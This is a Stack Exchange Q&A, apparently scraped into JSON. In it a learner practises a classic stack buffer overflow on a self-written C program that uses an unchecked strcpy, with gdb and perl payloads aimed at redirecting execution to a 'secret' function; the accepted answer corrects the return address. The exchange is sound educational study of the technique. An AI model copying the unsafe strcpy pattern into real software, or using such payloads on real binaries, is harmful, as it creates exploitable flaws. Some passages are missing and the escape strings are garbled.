{
  "title": "Writing an exploit for sample-application",
  "link": "https://reverseengineering.stackexchange.com/questions/11020/writing-an-exploit-for-sample-application",
  "content": "I understand the principles of exploiting a classical stack-based buffer-overflow, and now I want to practice it. Therefore I wrote the following test-application:\n\n```\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\nvoid public(char *args) {\n    char buff[12];\n    memset(buff, 'B', sizeof(buff));\n\n    strcpy(buff, args);\n    printf(\"  \nbuff: [%s] (%p)(%d)  \n  \n\", &buff, buff, sizeof(buff));\n}\n\nvoid secret(void) {\n    printf(\"SECRET  \n\");\n    exit(0);\n}\n\nint main(int argc, char *argv[]) {\n    int uid;\n    uid = getuid();\n\n    // Only when the user is root\n    if (uid == 0)\n        secret();\n\n    if (argc > 1) {\n        public(argv[1]);\n    }\n    else\n        printf(\"Kein Argument!  \n\");\n}\n\n```\nWhen the user which starts the program is root, the method secret() is being called, otherwise, the method public(...) is being called.\nI am using debian-gnome x64, so I had to compile it specifically to x86 to get x86-assembly (which I know better than x64).\nI compiled the program with gcc: gcc ret.c -o ret -m32 -g -fno-stack-protector\n\nTarget:\nI want to call the method secret() without being a root-user. {To do that I have to overwrite the Return Instruction Pointer (RIP) with the address of the function secret()}\n\nVulnerability:\nThe method public(...) copies the program-args with the unsafe strcpy() method into the char-array buff. So it is possible to overwrite data on the stack, when the user starts the program with an arg > 11, where arg should be the length of the string-arg.\n\nRequired Information:\n\nMethodical approach:\n\nThis means that I would have to run the program with 0xffffd2ec - 0xffffd2d4 + 0x04 = 28 bytes (= chars).\n\nSo, to exploit it I'd have to run the program with an arg which is 28 bytes long whereas the last 4 bytes contain the address of the function secret() (and pay attention to little-endian-ordering):\n\n```\n(gdb) run `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\n\nStarting program: /home/patrick/Projekte/C/I. Stack_Overflow/ret `perl -e '{print \"A\"x24; print \"\\xec\\d2\\ff\\ff\"; }'`\n\nbuff: [AAAAAAAAAAAAAAAAAAAAAAAAï¿½d2\n                                  f\n                                   f] (0xffffd2b4)(12)\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0c3264ec in ?? ()\n\n```\nTwo questions are rising up:\n\nEDIT: That's a download-link to the binary.\n\n",
  "votes": "5",
  "answers": 1,
  "views": "3k",
  "tags": [
    "c++",
    "gdb",
    "c",
    "exploit",
    "stack"
  ],
  "user": "JDoens",
  "time": "Oct 4, 2015 at 22:58",
  "comments": [
    {
      "user": "Jason Geffner",
      "text": "It would help if you could provide a link to the binary.",
      "time": null
    },
    {
      "user": "JDoens",
      "text": "Thanks that you want to help me! That's the link to the binary.",
      "time": null
    }
  ],
  "answers_data": [
    {
      "content": "It's because you're overwriting the return address on the stack with 0xffffd2ec instead of 0x0804852f (the latter is the address for secret()).\n\nIf you thus use '{print \"A\"x24; print \"\\x2f\\85\\04\\08\"; }' instead, it should work.\n\nThat gap is probably because of attempted optimizations made by gcc. The memory-area contains nothing (well, technically it contains 8 bytes whose values are indeterminate) and the code in the public() function neither reads from nor writes to that memory-area.\n\n",
      "votes": "5",
      "user": "Jason Geffner",
      "time": "Oct 4, 2015 at 23:49",
      "is_accepted": true,
      "comments": [
        {
          "user": "JDoens",
          "text": "Thanks! You are right, I did not overwrite the RIP with secret()s address. But you forgot to reverse the byte-order (it's little-endian).",
          "time": null
        },
        {
          "user": "Jason Geffner",
          "text": "Good catch; just fixed the byte-order.",
          "time": null
        }
      ]
    }
  ]
}